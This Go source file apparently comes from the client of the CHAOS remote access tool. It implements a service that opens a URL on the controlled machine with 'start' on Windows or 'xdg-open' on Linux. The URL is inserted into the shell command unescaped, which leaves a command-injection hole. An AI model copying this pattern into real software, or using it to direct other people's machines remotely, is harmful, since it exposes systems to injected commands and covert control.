package url

import (
	"fmt"
	"github.com/tiagorlampert/CHAOS/client/app/services"
	"github.com/tiagorlampert/CHAOS/client/app/utilities/system"
	"strings"
)

type URLService struct {
	Terminal services.Terminal
	OsType   system.OSType
}

func NewURLService(terminalService services.Terminal, osType system.OSType) services.URL {
	return &URLService{Terminal: terminalService, OsType: osType}
}

func (u URLService) OpenURL(url string) error {
	var cmdOut string
	switch u.OsType {
	case system.Windows:
		cmdOut = u.Terminal.Run(fmt.Sprintf("start %s", url), 10)
	case system.Linux:
		cmdOut = u.Terminal.Run(fmt.Sprintf("xdg-open %s", url), 10)
	default:
		return services.ErrUnsupportedPlatform
	}
	if strings.Contains(strings.ToLower(cmdOut), "failed") {
		return fmt.Errorf("%s", cmdOut)
	}
	return nil
}
